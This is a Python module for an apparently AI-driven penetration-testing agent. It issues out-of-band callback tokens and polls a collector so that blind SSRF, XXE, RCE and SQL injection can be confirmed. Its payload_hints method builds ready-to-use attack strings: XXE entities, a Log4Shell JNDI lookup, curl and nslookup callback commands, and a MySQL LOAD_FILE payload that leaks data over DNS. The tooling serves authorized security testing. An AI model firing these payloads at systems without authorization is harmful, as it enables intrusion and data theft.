"""
OOB — out-of-band interaction detection (blind-vuln confirmation).

The hunters' prompts already tell the model to "use a Burp Collaborator /
interactsh DNS callback" to confirm blind SSRF, blind XXE, blind/OAST RCE, and
OOB SQLi — but until now there was no tool that actually *hands out* a callback
domain or *checks* for hits, so an entire category of blind vulnerabilities was
un-provable. This is that capability.

The agent flow:
  1. ``register_oob_probe(label)`` mints a unique callback token + URL/host and
     returns ready-to-embed payload hints (SSRF URL, XXE entity, etc.).
  2. The hunter embeds that URL/host in a payload via send_http_request /
     custom_probe / a scanner and fires it at the target.
  3. ``check_oob_interactions(token)`` polls the collector; a DNS or HTTP hit on
     that exact token is proof the target made a server-side request → the blind
     vuln is confirmed.

Provider abstraction (an offensive agent runs in varied networks):
  * **webhook (default when configured)** — air-gap-friendly and dependency-free:
    point ``AEGIS_OOB_DOMAIN`` at a base domain whose DNS/HTTP interactions your
    own collector logs, and ``AEGIS_OOB_POLL_URL`` at that collector's poll API
    (``GET <poll_url>?token=<token>`` → JSON interactions). Works with a
    self-hosted interactsh, a DNS-logger + HTTP poll, or a webhook.site-style bin.
  * **interactsh** — the public/hosted ProjectDiscovery protocol; optional,
    behind config, and only if the client deps are present (documented, not
    bundled, to keep this dependency-free and testable).
  * **disabled (default)** — tools return a structured "not configured" result
    telling the operator exactly what to set. Honest: no silent no-op.

The HTTP fetch is injectable so polling/parsing is unit-tested; nothing here
reaches the network in tests.
"""
from __future__ import annotations

import json
import logging
import os
import secrets
import time
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional

logger = logging.getLogger("agent.oob")

# Injectable fetch: (url) -> parsed JSON. Raises on failure.
Fetcher = Callable[[str], Any]


@dataclass
class OOBProbe:
    token: str
    dns_host: str
    http_url: str
    provider: str
    label: str = ""
    created_at: float = field(default_factory=time.time)

    def payload_hints(self) -> Dict[str, str]:
        """Ready-to-embed payloads carrying this probe's callback."""
        h, u = self.dns_host, self.http_url
        return {
            "ssrf_url": u,
            "ssrf_url_host": h,
            "redirect_url": u,
            "xxe_entity": (
                f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
                f'"{u}xxe">]><r>&x;</r>'
            ),
            "xxe_param_entity": (
                f'<!ENTITY % ext SYSTEM "{u}dtd"> %ext;'
            ),
            "log4shell": f"${{jndi:ldap://{h}/a}}",
            "rce_curl": f"curl {u}rce  # active RCE — requires explicit ROE authorization",
            "rce_nslookup": f"nslookup {h}  # DNS-only, lower-impact blind check",
            "sqli_oob_mysql": (
                f"' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.{h}\\\\a'))-- -"
            ),
        }

    def to_dict(self) -> Dict[str, Any]:
        return {
            "token": self.token,
            "dns_host": self.dns_host,
            "http_url": self.http_url,
            "provider": self.provider,
            "label": self.label,
            "payload_hints": self.payload_hints(),
            "note": (
                "Embed dns_host/http_url in a payload, fire it, then call "
                "check_oob_interactions(token). A DNS or HTTP hit on this token "
                "proves a server-side request (blind vuln confirmed)."
            ),
        }


@dataclass
class Interaction:
    protocol: str          # dns | http | smtp | ldap
    remote_addr: str = ""
    timestamp: str = ""
    raw: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "protocol": self.protocol,
            "remote_addr": self.remote_addr,
            "timestamp": self.timestamp,
            "raw": self.raw[:500],
        }


def _default_fetch(url: str) -> Any:
    headers = {"User-Agent": "aegis-vanguard/oob"}
    key = os.environ.get("AEGIS_OOB_POLL_KEY")
    if key:
        headers["Authorization"] = f"Bearer {key}"
    req = urllib.request.Request(url, headers=headers)
    with urllib.request.urlopen(req, timeout=15) as r:  # noqa: S310 (configured host)
        return json.load(r)


def parse_interactions(data: Any) -> List[Interaction]:
    """Parse a collector's poll response into interactions.

    Accepts a list of interaction objects, or a dict wrapping them under a
    common key (``interactions`` / ``data`` / ``results`` / ``hits``)."""
    items = data
    if isinstance(data, dict):
        for key in ("interactions", "data", "results", "hits"):
            if isinstance(data.get(key), list):
                items = data[key]
                break
        else:
            items = []
    out: List[Interaction] = []
    for it in items or []:
        if not isinstance(it, dict):
            continue
        proto = str(
            it.get("protocol") or it.get("proto") or it.get("type") or "http"
        ).lower()
        out.append(Interaction(
            protocol=proto,
            remote_addr=str(it.get("remote-address") or it.get("remote_addr")
                            or it.get("source-ip") or it.get("client") or ""),
            timestamp=str(it.get("timestamp") or it.get("time") or it.get("ts") or ""),
            raw=str(it.get("raw-request") or it.get("raw") or it.get("q")
                    or json.dumps(it, default=str)),
        ))
    return out


class OOBClient:
    """Mints callback probes and polls a collector for interactions."""

    def __init__(self, fetch: Optional[Fetcher] = None):
        self.domain = (os.environ.get("AEGIS_OOB_DOMAIN") or "").strip().lstrip(".")
        self.poll_url = (os.environ.get("AEGIS_OOB_POLL_URL") or "").strip()
        self.provider = (os.environ.get("AEGIS_OOB_PROVIDER") or "webhook").strip().lower()
        self._fetch = fetch or _default_fetch
        self._registry: Dict[str, OOBProbe] = {}

    @property
    def enabled(self) -> bool:
        return bool(self.domain and self.poll_url)

    def help(self) -> Dict[str, Any]:
        return {
            "enabled": False,
            "error": "OOB not configured",
            "howto": (
                "Set AEGIS_OOB_DOMAIN to a base domain your collector logs "
                "(e.g. oob.lab.example) and AEGIS_OOB_POLL_URL to its poll API "
                "(GET <poll_url>?token=<token> → JSON interactions). Optional "
                "AEGIS_OOB_POLL_KEY for auth. Works with a self-hosted "
                "interactsh, a DNS logger + HTTP poll, or a webhook bin."
            ),
        }

    def new_probe(self, label: str = "") -> OOBProbe:
        token = secrets.token_hex(7)  # 14 hex chars — unique, DNS-safe
        dns_host = f"{token}.{self.domain}"
        probe = OOBProbe(
            token=token,
            dns_host=dns_host,
            http_url=f"http://{dns_host}/",
            provider=self.provider,
            label=label[:120],
        )
        self._registry[token] = probe
        return probe

    def poll(self, token: str) -> List[Interaction]:
        """Poll the collector for interactions on ``token``. Never raises."""
        if not self.enabled or not token:
            return []
        sep = "&" if "?" in self.poll_url else "?"
        url = f"{self.poll_url}{sep}token={urllib.parse.quote(token)}"
        try:
            data = self._fetch(url)
        except Exception as exc:
            logger.info("oob: poll for %s failed — %s", token, exc)
            return []
        try:
            return parse_interactions(data)
        except Exception as exc:
            logger.warning("oob: could not parse poll response — %s", exc)
            return []


_client: Optional[OOBClient] = None


def get_oob_client() -> OOBClient:
    global _client
    if _client is None:
        _client = OOBClient()
    return _client


def reset_oob_client() -> None:
    """Test hook: drop the singleton so env changes take effect."""
    global _client
    _client = None


__all__ = [
    "OOBProbe",
    "Interaction",
    "OOBClient",
    "parse_interactions",
    "get_oob_client",
    "reset_oob_client",
]
